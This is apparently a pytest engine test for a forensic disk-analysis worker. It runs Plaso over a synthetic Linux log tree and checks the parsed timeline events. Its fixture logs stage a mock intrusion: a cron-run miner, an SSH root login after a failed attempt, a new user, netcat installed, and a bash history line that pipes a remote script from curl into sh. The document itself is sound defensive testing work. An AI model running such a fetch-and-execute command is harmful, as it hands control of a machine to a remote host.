"""Engine test of the Plaso timeline (M9 phase 3, `--heavy` lanes): the real Plaso 20261027 in
/opt/plaso through the real sandbox (`stage.run_stage`: tool uid, seccomp, rlimits, the audit
hook of `cyberlab_plaso_launch`), on a small Linux tree written here (the phase-3a spike's tree:
syslog, auth.log with `Accepted` / `Failed password` / `useradd`, a `utmpdump -r` wtmp, a bash
history, a dpkg log, `etc/timezone`, and a gzip stream named like a log).

The tree is laid out exactly as phase 2's `collect` stage leaves it (`collect-p1-out/artifacts/
p1/...`, `collected.jsonl`, root's `input/collect-p1.json`), then sealed, so the runner, the
launcher and the normalizer run unchanged. Skipped unless /opt/plaso exists and the test runs
as root inside the disk worker image (the `dirs` fixture).

Asserted: both stages `ok` with zero audit-hook counts; the expected data types; original
paths and file links restored; the time zone taken from `etc/timezone`; the gzip "auth.log"
yields no event in `triage` (`--skip_compressed_streams`, RT11).
"""

import gzip
import json
import os
import shutil
import subprocess
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest
from cyberlab_jobs.disk import DiskArtifact, DiskPartitionRecord, StageStatus
from cyberlab_worker import sandbox

from disk_worker import stage, timeline
from disk_worker.budget import Budget
from disk_worker.normalize.events import EventSource
from tests.unit.phase2_helpers import limits

pytestmark = pytest.mark.engine
PLASO = Path("/opt/plaso/bin/python")
MTIME = datetime(2026, 10, 2, 12, 0, tzinfo=UTC).timestamp()

SYSLOG = (
    "Oct  1 10:00:00 srv-01 CRON[901]: (root) CMD (/tmp/.x/miner)\n"
    "Oct  1 10:05:00 srv-01 systemd[1]: Started Daily apt download activities.\n"
)
AUTH = (
    "Oct  1 10:01:00 srv-01 sshd[811]: Failed password for invalid user admin from "
    "198.51.100.7 port 50111 ssh2\n"
    "Oct  1 10:02:00 srv-01 sshd[812]: Accepted password for root from 198.51.100.7 port "
    "50122 ssh2\n"
    "Oct  1 10:03:00 srv-01 useradd[820]: new user: name=svc_backup, UID=1001, GID=1001, "
    "home=/home/svc_backup, shell=/bin/bash, from=/dev/pts/0\n"
)
BASH = "#1790000660\ncurl -s http://198.51.100.9/x.sh | sh\n"
DPKG = "2026-10-01 10:04:00 status installed netcat-openbsd:amd64 1.226-1\n"
UTMP_TEXT = (
    "[7] [00812] [ts/0] [root    ] [pts/0       ] [198.51.100.7        ] [198.51.100.7   ] "
    "[2026-10-01T08:02:30,000000+00:00]\n"
)
# (target = original path, artifact)
TREE: dict[str, DiskArtifact] = {
    "etc/timezone": DiskArtifact.PREPROCESS,
    "etc/hostname": DiskArtifact.PREPROCESS,
    "var/log/syslog": DiskArtifact.SYSLOG,
    "var/log/auth.log": DiskArtifact.AUTH_LOG,
    "var/log/auth.log.1": DiskArtifact.AUTH_LOG,  # gzip content under a plain log name
    "root/.bash_history": DiskArtifact.SHELL_HISTORY,
    "var/log/dpkg.log": DiskArtifact.PACKAGES,
    "var/log/wtmp": DiskArtifact.UTMP,
}


def _wtmp() -> bytes | None:
    tool = shutil.which("utmpdump")
    if tool is None:
        return None
    done = subprocess.run(  # noqa: S603 - fixed argv, our own text
        [tool, "-r"], input=UTMP_TEXT.encode(), capture_output=True, check=False
    )
    return done.stdout if done.returncode == 0 and done.stdout else None


def _contents() -> dict[str, bytes]:
    out = {
        "etc/timezone": b"Europe/Berlin\n",
        "etc/hostname": b"srv-01\n",
        "var/log/syslog": SYSLOG.encode(),
        "var/log/auth.log": AUTH.encode(),
        "var/log/auth.log.1": gzip.compress(AUTH.replace("812", "999").encode(), mtime=0),
        "root/.bash_history": BASH.encode(),
        "var/log/dpkg.log": DPKG.encode(),
    }
    wtmp = _wtmp()
    if wtmp is not None:
        out["var/log/wtmp"] = wtmp
    return out


def _collect(dirs: sandbox.JobDirs, contents: dict[str, bytes]) -> None:
    """Phase 2's collect output for partition 1, sealed."""
    sd = stage.fresh(dirs, stage.collect_name(1))
    mirror = sd.out / "artifacts" / "p1"
    items, rows = [], []
    for n, (rel, data) in enumerate(sorted(contents.items())):
        path = mirror / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        os.utime(path, (MTIME, MTIME))
        item = {
            "n": n,
            "meta_addr": 100 + n,
            "meta_seq": 1,
            "stream": None,
            "path": rel,
            "artifact": TREE[rel].value,
            "max_bytes": 1024**2,
        }
        items.append(item)
        rows.append({**item, "status": "ok", "target": rel, "size": len(data)})
        del rows[-1]["max_bytes"]
    (sd.out / "collected.jsonl").write_text("".join(json.dumps(r) + "\n" for r in rows))
    (dirs.input / f"{stage.collect_name(1)}.json").write_text(
        json.dumps({"partition_index": 1, "items": items})
    )
    stage.seal(sd.out)


@pytest.mark.skipif(not PLASO.exists(), reason="/opt/plaso (the disk worker image) not present")
def test_plaso_on_a_linux_tree(dirs: sandbox.JobDirs, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("DISK_TIMELINE_ENGINE", raising=False)
    contents = _contents()
    _collect(dirs, contents)
    part = DiskPartitionRecord(
        index=1,
        start_sector=2048,
        length_sectors=1_000_000,
        fs_type="ext4",
        fs_status="ok",
        os="linux",
    )
    lim = limits()
    budget = Budget(datetime.now(UTC) + timedelta(hours=4), lim)
    out = timeline.run_timeline(dirs, [part], "triage", lim, budget)

    assert out.engine == "plaso"
    assert [(s.stage, s.status) for s in out.stages] == [
        ("log2timeline", StageStatus.OK),
        ("event_export", StageStatus.OK),
    ], [(s.stage, s.status, s.reason, s.error_code) for s in out.stages]
    for s in out.stages:
        assert s.audit_counts and not any(s.audit_counts.values()), s.audit_counts
    assert out.stages[0].reason is None  # etc/timezone was collected: no `--timezone UTC`

    assert out.events_path is not None
    events = list(EventSource(out.events_path, lim).events())
    types = {e.data_type for e in events}
    assert {"syslog:line", "syslog:ssh:login", "bash:history:command", "dpkg:line"} <= types, types
    if "var/log/wtmp" in contents:
        assert "linux:utmp:event" in types
    # Original paths and file links back; the gzip stream named auth.log.1 gave nothing.
    assert {e.path for e in events} <= set(contents)
    assert "var/log/auth.log.1" not in {e.path for e in events}
    assert all(e.file is not None and e.file.meta_addr >= 100 for e in events)
    login = next(e for e in events if e.data_type == "syslog:ssh:login")
    assert login.artifact == DiskArtifact.AUTH_LOG
    assert login.attributes.get("address") == "198.51.100.7"
    # 10:02 in Europe/Berlin (CEST, UTC+2) is 08:02 UTC: the zone came from etc/timezone.
    assert (login.ts.hour, login.ts.minute) == (8, 2)
